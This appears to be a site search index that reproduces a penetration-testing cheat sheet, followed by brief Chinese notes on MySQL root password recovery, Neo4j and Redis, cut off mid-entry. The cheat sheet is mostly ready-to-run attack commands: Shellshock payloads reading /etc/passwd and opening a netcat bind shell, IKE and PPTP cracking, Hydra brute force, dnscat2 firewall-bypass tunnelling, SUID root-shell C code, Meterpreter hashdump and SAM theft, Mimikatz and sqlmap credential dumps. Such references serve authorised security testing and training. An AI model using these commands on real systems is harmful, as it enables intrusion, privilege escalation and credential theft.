wordlists/groupnames.dic\n</code></pre>"},{"location":"daily/55-highon-coffee/#step-3-use-ike-scan-to-capture-the-psk-hash","title":"Step 3: Use ike-scan to capture the PSK hash","text":"<pre><code>ike-scan \u2013M \u2013A \u2013n example_group -P hash-file.txt TARGET-IP\n</code></pre>"},{"location":"daily/55-highon-coffee/#step-4-use-psk-crack-to-crack-the-psk-hash","title":"Step 4: Use psk-crack to crack the PSK hash","text":"<pre><code>psk-crack hash-file.txt\n</code></pre> <p>Some more advanced psk-crack options below:</p> <pre><code>pskcrack\npsk-crack -b 5 TARGET-IPkey\npsk-crack -b 5 --charset=\"01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\" 192-168-207-134key\npsk-crack -d /path/to/dictionary-file TARGET-IP-key\n</code></pre>"},{"location":"daily/55-highon-coffee/#pptp-hacking","title":"PPTP Hacking","text":"<p>Identifying PPTP, it listens on TCP: 1723</p>"},{"location":"daily/55-highon-coffee/#nmap-pptp-fingerprint","title":"NMAP PPTP Fingerprint:","text":"<pre><code>nmap \u2013Pn -sV -p 1723 TARGET(S)\n</code></pre>"},{"location":"daily/55-highon-coffee/#pptp-dictionary-attack","title":"PPTP Dictionary Attack","text":"<pre><code>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst\n</code></pre>"},{"location":"daily/55-highon-coffee/#dns-tunneling","title":"DNS Tunneling","text":"<p>Tunneling data over DNS to bypass firewalls.</p> <p>dnscat2 supports \u201cdownload\u201d and \u201cupload\u201d commands for getting files (data and programs) to and from the target machine.</p>"},{"location":"daily/55-highon-coffee/#attacking-machine","title":"Attacking Machine","text":"<p>Installtion:</p> <pre><code>apt-get update\napt-get -y install ruby-dev git make g++\ngem install bundler\ngit clone https://github.com/iagox86/dnscat2.git\ncd dnscat2/server\nbundle install\n</code></pre> <p>Run dnscat2:</p> <pre><code>ruby ./dnscat2.rb\ndnscat2&gt; New session established: 1422\ndnscat2&gt; session -i 1422\n</code></pre> <p>Target Machine:</p> <p>https://downloads.skullsecurity.org/dnscat2/ https://github.com/lukebaggett/dnscat2-powershell/</p> <pre><code>dnscat --host &lt;dnscat server_ip&gt;\n</code></pre>"},{"location":"daily/55-highon-coffee/#bof-exploit","title":"BOF / Exploit","text":""},{"location":"daily/55-highon-coffee/#exploit-research","title":"Exploit Research","text":"<p>Find exploits for enumerated hosts / services.</p> COMMAND DESCRIPTION <code>searchsploit windows 2003 | grep -i local</code> Search exploit-db for exploit, in this example windows 2003 + local esc <code>site:exploit-db.com exploit kernel &lt;= 3</code> Use google to search exploit-db.com for exploits <code>grep -R \"W7\" /usr/share/metasploit-framework/modules/exploit/windows/*</code> Search metasploit modules using grep - msf search sucks a bit"},{"location":"daily/55-highon-coffee/#searching-for-exploits","title":"Searching for Exploits","text":"<p>Install local copy of exploit-db:</p> <pre><code> searchsploit \u2013u\n searchsploit apache 2.2\n searchsploit \"Linux Kernel\"\n searchsploit linux 2.6 | grep -i ubuntu | grep local\n</code></pre>"},{"location":"daily/55-highon-coffee/#compiling-windows-exploits-on-kali","title":"Compiling Windows Exploits on Kali","text":"<pre><code>  wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download\n  wine mingw-get-setup.exe\n  select mingw32-base\n  cd /root/.wine/drive_c/windows\n  wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip\n  cd /root/.wine/drive_c/MinGW/bin\n  wine gcc -o ability.exe /tmp/exploit.c -lwsock32\n  wine ability.exe  \n</code></pre>"},{"location":"daily/55-highon-coffee/#cross-compiling-exploits","title":"Cross Compiling Exploits","text":"<pre><code>gcc -m32 -o output32 hello.c (32 bit)\ngcc -m64 -o output hello.c (64 bit)\n</code></pre>"},{"location":"daily/55-highon-coffee/#exploiting-common-vulnerabilities","title":"Exploiting Common Vulnerabilities","text":""},{"location":"daily/55-highon-coffee/#exploiting-shellshock","title":"Exploiting Shellshock","text":"<p>A tool to find and exploit servers vulnerable to Shellshock:</p> <pre><code>git clone https://github.com/nccgroup/shocker\n./shocker.py -H TARGET  --command \"/bin/cat /etc/passwd\" -c /cgi-bin/status --verbose\n</code></pre>"},{"location":"daily/55-highon-coffee/#cat-file-view-file-contents","title":"cat file (view file contents)","text":"<pre><code>echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; echo \\$(&lt;/etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc TARGET 80\n</code></pre>"},{"location":"daily/55-highon-coffee/#shell-shock-run-bind-shell","title":"Shell Shock run bind shell","text":"<pre><code>echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc TARGET 80\n</code></pre>"},{"location":"daily/55-highon-coffee/#shell-shock-reverse-shell","title":"Shell Shock reverse Shell","text":"<pre><code>nc -l -p 443\n</code></pre>"},{"location":"daily/55-highon-coffee/#simple-local-web-servers","title":"Simple Local Web Servers","text":"<p>Python local web server command, handy for serving up shells and exploits on an attacking machine.</p> COMMAND DESCRIPTION <code>python -m SimpleHTTPServer 80</code> Run a basic http server, great for serving up shells etc <code>python3 -m http.server</code> Run a basic Python3 http server, great for serving up shells etc <code>ruby -rwebrick -e \"WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start\"</code> Run a ruby webrick basic http server <code>php -S 0.0.0.0:80</code> Run a basic PHP http server"},{"location":"daily/55-highon-coffee/#mounting-file-shares","title":"Mounting File Shares","text":"<p>How to mount NFS / CIFS, Windows and Linux file shares.</p> COMMAND DESCRIPTION <code>mount 192.168.1.1:/vol/share /mnt/nfs</code> Mount NFS share to <code>/mnt/nfs</code> <code>mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs</code> Mount Windows CIFS / SMB share on Linux at <code>/mnt/cifs</code> if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history) <code>net use Z: \\\\win-server\\share password  /user:domain\\janedoe /savecred /p:no</code> Mount a Windows share on Windows from the command line <code>apt-get install smb4k -y</code> Install smb4k on Kali, useful Linux GUI for browsing SMB shares"},{"location":"daily/55-highon-coffee/#http-https-webserver-enumeration","title":"HTTP / HTTPS Webserver Enumeration","text":"COMMAND DESCRIPTION <code>nikto -h 192.168.1.1</code> Perform a nikto scan against target <code>dirbuster</code> Configure via GUI, CLI input doesn't work most of the time"},{"location":"daily/55-highon-coffee/#packet-inspection","title":"Packet Inspection","text":"COMMAND DESCRIPTION <code>tcpdump tcp port 80 -w output.pcap -i eth0</code> tcpdump for port 80 on interface eth0, outputs to output.pcap"},{"location":"daily/55-highon-coffee/#username-enumeration","title":"Username Enumeration","text":"<p>Some techniques used to remotely enumerate users on a target system.</p>"},{"location":"daily/55-highon-coffee/#smb-user-enumeration","title":"SMB User Enumeration","text":"COMMAND DESCRIPTION <code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</code> Enumerate users from SMB <code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</code> RID cycle SMB / enumerate users from SMB"},{"location":"daily/55-highon-coffee/#snmp-user-enumeration","title":"SNMP User Enumeration","text":"COMMAND DESCRIPTION <code>snmpwalk public -v1 192.168.X.XXX 1 |grep 77.1.2.25 |cut -d\u201d \u201c -f4</code> Enmerate users from SNMP <code>python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX</code> Enmerate users from SNMP <code>nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)</code> Search for SNMP servers with nmap, grepable output"},{"location":"daily/55-highon-coffee/#passwords","title":"Passwords","text":""},{"location":"daily/55-highon-coffee/#wordlists","title":"Wordlists","text":"COMMAND DESCRIPTION <code>/usr/share/wordlists</code> Kali word lists"},{"location":"daily/55-highon-coffee/#brute-forcing-services","title":"Brute Forcing Services","text":""},{"location":"daily/55-highon-coffee/#hydra-ftp-brute-force","title":"Hydra FTP Brute Force","text":"COMMAND DESCRIPTION <code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V</code> Hydra FTP brute force"},{"location":"daily/55-highon-coffee/#hydra-pop3-brute-force","title":"Hydra POP3 Brute Force","text":"COMMAND DESCRIPTION <code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V</code> Hydra POP3 brute force"},{"location":"daily/55-highon-coffee/#hydra-smtp-brute-force","title":"Hydra SMTP Brute Force","text":"COMMAND DESCRIPTION <code>hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V</code> Hydra SMTP brute force <p>Use <code>-t</code> to limit concurrent connections, example: <code>-t 15</code></p>"},{"location":"daily/55-highon-coffee/#password-cracking","title":"Password Cracking","text":"<p>Password cracking penetration testing tools.</p>"},{"location":"daily/55-highon-coffee/#john-the-ripper-jtr","title":"John The Ripper - JTR","text":"COMMAND DESCRIPTION <code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code> JTR password cracking <code>john --format=descrypt --wordlist /usr/share/wordlists/rockyou.txt hash.txt</code> JTR forced descrypt cracking with wordlist <code>john --format=descrypt hash --show</code> JTR forced descrypt brute force cracking"},{"location":"daily/55-highon-coffee/#windows-penetration-testing-commands","title":"Windows Penetration Testing Commands","text":"<p>See Windows Penetration Testing Commands.</p>"},{"location":"daily/55-highon-coffee/#linux-penetration-testing-commands","title":"Linux Penetration Testing Commands","text":"<p>See Linux Commands Cheat Sheet (right hand menu) for a list of Linux Penetration testing commands, useful for local system enumeration.</p>"},{"location":"daily/55-highon-coffee/#compiling-exploits","title":"Compiling Exploits","text":"<p>Some notes on compiling exploits.</p>"},{"location":"daily/55-highon-coffee/#identifying-if-c-code-is-for-windows-or-linux","title":"Identifying if C code is for Windows or Linux","text":"<p>C #includes will indicate which OS should be used to build the exploit.</p> COMMAND DESCRIPTION <code>process.h, string.h, winbase.h, windows.h, winsock2.h</code> Windows exploit code <code>arpa/inet.h, fcntl.h, netdb.h, netinet/in.h,  sys/sockt.h, sys/types.h, unistd.h</code> Linux exploit code"},{"location":"daily/55-highon-coffee/#build-exploit-gcc","title":"Build Exploit GCC","text":"<p>Compile exploit gcc.</p> COMMAND DESCRIPTION <code>gcc -o exploit exploit.c</code> Basic GCC compile"},{"location":"daily/55-highon-coffee/#gcc-compile-32bit-exploit-on-64bit-kali","title":"GCC Compile 32Bit Exploit on 64Bit Kali","text":"<p>Handy for cross compiling 32 bit binaries on 64 bit attacking machines.</p> COMMAND DESCRIPTION <code>gcc -m32 exploit.c -o exploit</code> Cross compile 32 bit binary on 64 bit Linux"},{"location":"daily/55-highon-coffee/#compile-windows-exe-on-linux","title":"Compile Windows .exe on Linux","text":"<p>Build / compile windows exploits on Linux, resulting in a .exe file.</p> COMMAND DESCRIPTION <code>i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code> Compile windows .exe on Linux"},{"location":"daily/55-highon-coffee/#suid-binary","title":"SUID Binary","text":"<p>Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required.</p> <p>below are some quick copy and pate examples for various shells:</p>"},{"location":"daily/55-highon-coffee/#suid-c-shell-for-binbash","title":"SUID C Shell for /bin/bash","text":"<pre><code>int main(void){\n       setresuid(0, 0, 0);\n       system(\"/bin/bash\");\n}       \n</code></pre>"},{"location":"daily/55-highon-coffee/#suid-c-shell-for-binsh","title":"SUID C Shell for /bin/sh","text":"<pre><code>int main(void){\n       setresuid(0, 0, 0);\n       system(\"/bin/sh\");\n}       \n</code></pre>"},{"location":"daily/55-highon-coffee/#building-the-suid-shell-binary","title":"Building the SUID Shell binary","text":"<pre><code>gcc -o suid suid.c  \n</code></pre> <p>For 32 bit:</p> <pre><code>gcc -m32 -o suid suid.c  \n</code></pre>"},{"location":"daily/55-highon-coffee/#reverse-shells","title":"Reverse Shells","text":"<p>See Reverse Shell Cheat Sheet for a list of useful Reverse Shells.</p>"},{"location":"daily/55-highon-coffee/#tty-shells","title":"TTY Shells","text":"<p>Tips / Tricks to spawn a TTY shell from a limited shell in Linux, useful for running commands like <code>su</code> from reverse shells.</p>"},{"location":"daily/55-highon-coffee/#python-tty-shell-trick","title":"Python TTY Shell Trick","text":"<pre><code>python -c 'import pty;pty.spawn(\"/bin/bash\")'\necho os.system('/bin/bash')\n</code></pre>"},{"location":"daily/55-highon-coffee/#spawn-interactive-sh-shell","title":"Spawn Interactive sh shell","text":"<pre><code>/bin/sh -i\n</code></pre>"},{"location":"daily/55-highon-coffee/#spawn-perl-tty-shell","title":"Spawn Perl TTY Shell","text":"<pre><code>exec \"/bin/sh\";\nperl \u2014e 'exec \"/bin/sh\";'\n</code></pre>"},{"location":"daily/55-highon-coffee/#spawn-ruby-tty-shell","title":"Spawn Ruby TTY Shell","text":"<pre><code>exec \"/bin/sh\"\n</code></pre>"},{"location":"daily/55-highon-coffee/#spawn-lua-tty-shell","title":"Spawn Lua TTY Shell","text":"<pre><code>os.execute('/bin/sh')\n</code></pre>"},{"location":"daily/55-highon-coffee/#spawn-tty-shell-from-vi","title":"Spawn TTY Shell from Vi","text":"<p>Run shell commands from vi:</p> <pre><code>:!bash\n</code></pre>"},{"location":"daily/55-highon-coffee/#spawn-tty-shell-nmap","title":"Spawn TTY Shell NMAP","text":"<pre><code>!sh\n</code></pre>"},{"location":"daily/55-highon-coffee/#metasploit-cheat-sheet","title":"Metasploit Cheat Sheet","text":"<p>A basic metasploit cheat sheet that I have found handy for reference.</p> <p>Basic Metasploit commands, useful for reference, for pivoting see - Meterpreter Pivoting techniques.</p>"},{"location":"daily/55-highon-coffee/#meterpreter-payloads","title":"Meterpreter Payloads","text":""},{"location":"daily/55-highon-coffee/#windows-reverse-meterpreter-payload","title":"Windows reverse meterpreter payload","text":"COMMAND DESCRIPTION <code>set payload windows/meterpreter/reverse_tcp</code> Windows reverse tcp payload"},{"location":"daily/55-highon-coffee/#windows-vnc-meterpreter-payload","title":"Windows VNC Meterpreter payload","text":"COMMAND DESCRIPTION <code>set payload windows/vncinject/reverse_tcp``set ViewOnly false</code> Meterpreter Windows VNC Payload"},{"location":"daily/55-highon-coffee/#linux-reverse-meterpreter-payload","title":"Linux Reverse Meterpreter payload","text":"COMMAND DESCRIPTION <code>set payload linux/meterpreter/reverse_tcp</code> Meterpreter Linux Reverse Payload"},{"location":"daily/55-highon-coffee/#meterpreter-cheat-sheet","title":"Meterpreter Cheat Sheet","text":"<p>Useful meterpreter commands.</p> COMMAND DESCRIPTION <code>upload file c:\\\\windows</code> Meterpreter upload file to Windows target <code>download c:\\\\windows\\\\repair\\\\sam /tmp</code> Meterpreter download file from Windows target <code>download c:\\\\windows\\\\repair\\\\sam /tmp</code> Meterpreter download file from Windows target <code>execute -f c:\\\\windows\\temp\\exploit.exe</code> Meterpreter run .exe on target - handy for executing uploaded exploits <code>execute -f cmd -c</code> Creates new channel with cmd shell <code>ps</code> Meterpreter show processes <code>shell</code> Meterpreter get shell on the target <code>getsystem</code> Meterpreter attempts priviledge escalation the target <code>hashdump</code> Meterpreter attempts to dump the hashes on the target <code>portfwd add \u2013l 3389 \u2013p 3389 \u2013r target</code> Meterpreter create port forward to target machine <code>portfwd delete \u2013l 3389 \u2013p 3389 \u2013r target</code> Meterpreter delete port forward"},{"location":"daily/55-highon-coffee/#common-metasploit-modules","title":"Common Metasploit Modules","text":"<p>Top metasploit modules.</p>"},{"location":"daily/55-highon-coffee/#remote-windows-metasploit-modules-exploits","title":"Remote Windows Metasploit Modules (exploits)","text":"COMMAND DESCRIPTION <code>use exploit/windows/smb/ms08_067_netapi</code> MS08_067 Windows 2k, XP, 2003 Remote Exploit <code>use exploit/windows/dcerpc/ms06_040_netapi</code> MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit <code>use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</code> MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit"},{"location":"daily/55-highon-coffee/#local-windows-metasploit-modules-exploits","title":"Local Windows Metasploit Modules (exploits)","text":"COMMAND DESCRIPTION <code>use exploit/windows/local/bypassuac</code> Bypass UAC on Windows 7 + Set target + arch, x86/64"},{"location":"daily/55-highon-coffee/#auxilary-metasploit-modules","title":"Auxilary Metasploit Modules","text":"COMMAND DESCRIPTION <code>use auxiliary/scanner/http/dir_scanner</code> Metasploit HTTP directory scanner <code>use auxiliary/scanner/http/jboss_vulnscan</code> Metasploit JBOSS vulnerability scanner <code>use auxiliary/scanner/mssql/mssql_login</code> Metasploit MSSQL Credential Scanner <code>use auxiliary/scanner/mysql/mysql_version</code> Metasploit MSSQL Version Scanner <code>use auxiliary/scanner/oracle/oracle_login</code> Metasploit Oracle Login Module"},{"location":"daily/55-highon-coffee/#metasploit-powershell-modules","title":"Metasploit Powershell Modules","text":"COMMAND DESCRIPTION <code>use exploit/multi/script/web_delivery</code> Metasploit powershell payload delivery module <code>post/windows/manage/powershell/exec_powershell</code> Metasploit upload and run powershell script through a session <code>use exploit/multi/http/jboss_maindeployer</code> Metasploit JBOSS deploy <code>use exploit/windows/mssql/mssql_payload</code> Metasploit MSSQL payload"},{"location":"daily/55-highon-coffee/#post-exploit-windows-metasploit-modules","title":"Post Exploit Windows Metasploit Modules","text":"<p>Windows Metasploit Modules for privilege escalation.</p> COMMAND DESCRIPTION <code>run post/windows/gather/win_privs</code> Metasploit show privileges of current user <code>use post/windows/gather/credentials/gpp</code> Metasploit grab GPP saved passwords <code>load mimikatz -&gt; wdigest</code> Metasplit load Mimikatz <code>run post/windows/gather/local_admin_search_enum</code> Idenitfy other machines that the supplied domain user has administrative access to <code>run post/windows/gather/smart_hashdump</code> Automated dumping of sam file, tries to esc privileges etc"},{"location":"daily/55-highon-coffee/#ascii-table-cheat-sheet","title":"ASCII Table Cheat Sheet","text":"<p>Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.</p> ASCII CHARACTER <code>x00</code> Null Byte <code>x08</code> BS <code>x09</code> TAB <code>x0a</code> LF <code>x0d</code> CR <code>x1b</code> ESC <code>x20</code> SPC <code>x21</code> ! <code>x22</code> \" <code>x23</code> # <code>x24</code> $ <code>x25</code> % <code>x26</code> &amp; <code>x27</code> ` <code>x28</code> ( <code>x29</code> ) <code>x2a</code> * <code>x2b</code> + <code>x2c</code> , <code>x2d</code> - <code>x2e</code> . <code>x2f</code> / <code>x30</code> 0 <code>x31</code> 1 <code>x32</code> 2 <code>x33</code> 3 <code>x34</code> 4 <code>x35</code> 5 <code>x36</code> 6 <code>x37</code> 7 <code>x38</code> 8 <code>x39</code> 9 <code>x3a</code> : <code>x3b</code> ; <code>x3c</code> &lt; <code>x3d</code> = <code>x3e</code> &gt; <code>x3f</code> ? <code>x40</code> @ <code>x41</code> A <code>x42</code> B <code>x43</code> C <code>x44</code> D <code>x45</code> E <code>x46</code> F <code>x47</code> G <code>x48</code> H <code>x49</code> I <code>x4a</code> J <code>x4b</code> K <code>x4c</code> L <code>x4d</code> M <code>x4e</code> N <code>x4f</code> O <code>x50</code> P <code>x51</code> Q <code>x52</code> R <code>x53</code> S <code>x54</code> T <code>x55</code> U <code>x56</code> V <code>x57</code> W <code>x58</code> X <code>x59</code> Y <code>x5a</code> Z <code>x5b</code> [ <code>x5c</code> \\ <code>x5d</code> ] <code>x5e</code> ^ <code>x5f</code> _ <code>x60</code> ` <code>x61</code> a <code>x62</code> b <code>x63</code> c <code>x64</code> d <code>x65</code> e <code>x66</code> f <code>x67</code> g <code>x68</code> h <code>x69</code> i <code>x6a</code> j <code>x6b</code> k <code>x6c</code> l <code>x6d</code> m <code>x6e</code> n <code>x6f</code> o <code>x70</code> p <code>x71</code> q <code>x72</code> r <code>x73</code> s <code>x74</code> t <code>x75</code> u <code>x76</code> v <code>x77</code> w <code>x78</code> x <code>x79</code> y <code>x7a</code> z"},{"location":"daily/55-highon-coffee/#cisco-ios-commands","title":"CISCO IOS Commands","text":"<p>A collection of useful Cisco IOS commands.</p> COMMAND DESCRIPTION <code>enable</code> Enters enable mode <code>conf t</code> Short for, configure terminal <code>(config)# interface fa0/0</code> Configure FastEthernet 0/0 <code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code> Add ip to fa0/0 <code>(config-if)# ip addr 0.0.0.0 255.255.255.255</code> Add ip to fa0/0 <code>(config-if)# line vty 0 4</code> Configure vty line <code>(config-line)# login</code> Cisco set telnet password <code>(config-line)# password YOUR-PASSWORD</code> Set telnet password <code># show running-config</code> Show running config loaded in memory <code># show startup-config</code> Show sartup config <code># show version</code> show cisco IOS version <code># show session</code> display open sessions <code># show ip interface</code> Show network interfaces <code># show interface e0</code> Show detailed interface info <code># show ip route</code> Show routes <code># show access-lists</code> Show access lists <code># dir file systems</code> Show available files <code># dir all-filesystems</code> File information <code># dir /all</code> SHow deleted files <code># terminal length 0</code> No limit on terminal output <code># copy running-config tftp</code> Copys running config to tftp server <code># copy running-config startup-config</code> Copy startup-config to running-config"},{"location":"daily/55-highon-coffee/#cryptography","title":"Cryptography","text":""},{"location":"daily/55-highon-coffee/#hash-lengths","title":"Hash Lengths","text":"HASH SIZE MD5 Hash Length <code>16 Bytes</code> SHA-1 Hash Length <code>20 Bytes</code> SHA-256 Hash Length <code>32 Bytes</code> SHA-512 Hash Length <code>64 Bytes</code>"},{"location":"daily/55-highon-coffee/#hash-examples","title":"Hash Examples","text":"<p>Likely just use hash-identifier for this but here are some example hashes:</p> HASH EXAMPLE MD5 Hash Example <code>8743b52063cd84097a65d1633f5c74f5</code> MD5 \\(PASS:\\)SALT Example <code>01dfae6e5d4d90d9892622325959afbe:7050461</code> MD5 \\(SALT:\\)PASS <code>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</code> SHA1 Hash Example <code>b89eaac7e61417341b710b727768294d0e6a277b</code> SHA1 \\(PASS:\\)SALT <code>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</code> SHA1 \\(SALT:\\)PASS <code>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</code> SHA-256 <code>127e6fbfe24a750e72930c220a8e138275656b8e5d8f48a98c3c92df2caba935</code> SHA-256 \\(PASS:\\)SALT <code>c73d08de890479518ed60cf670d17faa26a4a71f995c1dcc978165399401a6c4</code> SHA-256 \\(SALT:\\)PASS <code>eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617</code> SHA-512 <code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code> SHA-512 \\(PASS:\\)SALT <code>e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code> SHA-512 \\(SALT:\\)PASS <code>976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code> NTLM Hash Example <code>b4b9b02e6f09a9bd760f388b67351e2b</code>"},{"location":"daily/55-highon-coffee/#sqlmap-examples","title":"SQLMap Examples","text":"<p>A mini SQLMap cheat sheet:</p> COMMAND DESCRIPTION <code>sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3</code> Automated sqlmap scan <code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read=\"/var/www/blah.php\"</code> Targeted sqlmap scan <code>sqlmap -u \"http://meh.com/meh.php?id=1\" --dbms=mysql --tech=U --random-agent --dump</code> Scan url for union + error based injection with mysql backend and use a random user agent + database dump <code>sqlmap -o -u \"http://meh.com/form/\" --forms</code> sqlmap check form for injection <code>sqlmap -o -u \"http://meh/vuln-form\" --forms  -D database-name -T users --dump</code> sqlmap dump and crack hashes for table users on database-name."},{"location":"data/01-mysql/","title":"MySQL","text":""},{"location":"data/01-mysql/#root","title":"\u4e00\u3001\u5fd8\u8bb0root\u5bc6\u7801","text":""},{"location":"data/01-mysql/#11","title":"1.1 \u9996\u5148\u786e\u8ba4\u670d\u52a1\u5668\u51fa\u4e8e\u5b89\u5168\u7684\u72b6\u6001","text":"<p>\u4e5f\u5c31\u662f\u6ca1\u6709\u4eba\u80fd\u591f\u4efb\u610f\u5730\u8fde\u63a5MySQL\u6570\u636e\u5e93\u3002\u00a0 \u56e0\u4e3a\u5728\u91cd\u65b0\u8bbe\u7f6eMySQL\u7684root\u5bc6\u7801\u7684\u671f\u95f4\uff0cMySQL\u6570\u636e\u5e93\u5b8c\u5168\u51fa\u4e8e\u6ca1\u6709\u5bc6\u7801\u4fdd\u62a4\u7684\u00a0 \u72b6\u6001\u4e0b\uff0c\u5176\u4ed6\u7684\u7528\u6237\u4e5f\u53ef\u4ee5\u4efb\u610f\u5730\u767b\u5f55\u548c\u4fee\u6539MySQL\u7684\u4fe1\u606f\u3002\u53ef\u4ee5\u91c7\u7528\u5c06MySQL\u5bf9\u00a0 \u5916\u7684\u7aef\u53e3\u5c01\u95ed\uff0c\u5e76\u4e14\u505c\u6b62Apache\u4ee5\u53ca\u6240\u6709\u7684\u7528\u6237\u8fdb\u7a0b\u7684\u65b9\u6cd5\u5b9e\u73b0\u670d\u52a1\u5668\u7684\u51c6\u5b89\u5168\u00a0 \u72b6\u6001\u3002\u6700\u5b89\u5168\u7684\u72b6\u6001\u662f\u5230\u670d\u52a1\u5668\u7684Console\u4e0a\u9762\u64cd\u4f5c\uff0c\u5e76\u4e14\u62d4\u6389\u7f51\u7ebf\u3002\u00a0</p>"},{"location":"data/01-mysql/#12-mysql","title":"1.2 \u4fee\u6539MySQL\u7684\u767b\u5f55\u8bbe\u7f6e\uff1a","text":"<p>vi /etc/my.cnf\u00a0</p> <p>\u5728[mysqld]\u7684\u6bb5\u4e2d\u52a0\u4e0a\u4e00\u53e5\uff1askip-grant-tables\u00a0 \u4f8b\u5982\uff1a</p> <pre><code>[mysqld]\u00a0\ndatadir=/var/lib/mysql\u00a0\nsocket=/var/lib/mysql/mysql.sock\u00a0\nskip-grant-tables\u00a0\n</code></pre>"},{"location":"data/01-mysql/#13-mysqld","title":"1.3 \u91cd\u65b0\u542f\u52a8mysqld","text":"<p>/etc/init.d/mysqld restart\u00a0</p> <p>Stopping MySQL: [ OK ]\u00a0 Starting MySQL: [ OK ]\u00a0</p>"},{"location":"data/01-mysql/#14-mysqlroot","title":"1.4 \u767b\u5f55\u5e76\u4fee\u6539MySQL\u7684root\u5bc6\u7801","text":"<p>/usr/bin/mysql\u00a0</p> <pre><code>Welcome to the MySQL monitor. Commands end with ; or \\g.\u00a0\nYour MySQL connection id is 3 to server version: 3.23.56\u00a0\nType 'help;' or '\\h' for help. Type '\\c' to clear the buffer.\u00a0\nmysql&gt; USE mysql ;\u00a0\nReading table information for completion of table and column names\u00a0\nYou can turn off this feature to get a quicker startup with -A\u00a0\nDatabase changed\u00a0\nmysql&gt; UPDATE user SET Password = password ( 'xx' ) WHERE User = 'root' ;\u00a0\nQuery OK, 0 rows affected (0.00 sec)\u00a0\nRows matched: 2 Changed: 0 Warnings: 0\u00a0\nmysql&gt; flush privileges ;\u00a0\nQuery OK, 0 rows affected (0.01 sec)\u00a0\nmysql&gt; quit\u00a0\nBye\u00a0\n</code></pre>"},{"location":"data/01-mysql/#15-mysql","title":"1.5 \u5c06MySQL\u7684\u767b\u5f55\u8bbe\u7f6e\u4fee\u6539\u56de\u6765","text":"<p>vi /etc/my.cnf\u00a0</p> <p>\u5c06\u521a\u624d\u5728[mysqld]\u7684\u6bb5\u4e2d\u52a0\u4e0a\u7684skip-grant-tables\u5220\u9664\u00a0</p>"},{"location":"data/01-mysql/#16-mysqld","title":"1.6 \u91cd\u65b0\u542f\u52a8mysqld","text":"<p>/etc/init.d/mysqld restart\u00a0</p> <p>Stopping MySQL: [ OK ]\u00a0 Starting MySQL: [ OK ]</p> <pre><code>echo \"SET PASSWORD FOR root@localhost=PASSWORD('xx');\"&gt;/var/lib/mysql/rootpwd.sql\nservice mysql restart\nrm -f /var/lib/mysql/rootpwd.sql\n</code></pre> <pre><code>#/etc/my.conf\n[mysqld]\nskip-grant-tables\n\n#\u4fee\u6539\n#ALTER USER 'root'@'localhost' IDENTIFIED BY 'xx';\nupdate mysql.user set authentication_string=password('xx') where user='root' and Host = 'localhost';\n</code></pre>"},{"location":"data/02-neo4j/","title":"Neo4J","text":""},{"location":"data/02-neo4j/#_1","title":"\u5bfc\u5165\u5bfc\u51fa","text":"<pre><code>#\u5bfc\u51fa\n./neo4j-admin dump --database=graph.db --to=graph-20190222.db\n\n#\u5bfc\u5165\n./neo4j-admin load --from=graph-20190222.db --database=graph.db --force\n</code></pre>"},{"location":"data/03-redis/","title":"Redis","text":""},{"location":"data/03-redis/#_1","title":"\u4e00\u3001\u4e3b\u4ece\u6a21\u5f0f","text":""},{"location":"data/03-redis/#_2","title":"\u4e8c\u3001\u54e8\u5175\u6a21\u5f0f","text":""},{"location":"data/03-redis/#_3","title":"\u4e09\u3001\u96c6\u7fa4\u6a21\u5f0f","text":"<p>Reference</p> <p>Demo\u7b14\u8bb0</p> <pre><code>rm -rf /usr/local/redis/conf /opt/lib/redis\nmkdir -p /usr/local/redis/conf /opt/lib/redis\ncd /usr/local/redis/conf\n\n# ---\nfor i in 700{0..8}\ndo\nmkdir -p /opt/lib/redis/$i\n\ncat &gt; $i.conf &lt;&lt; 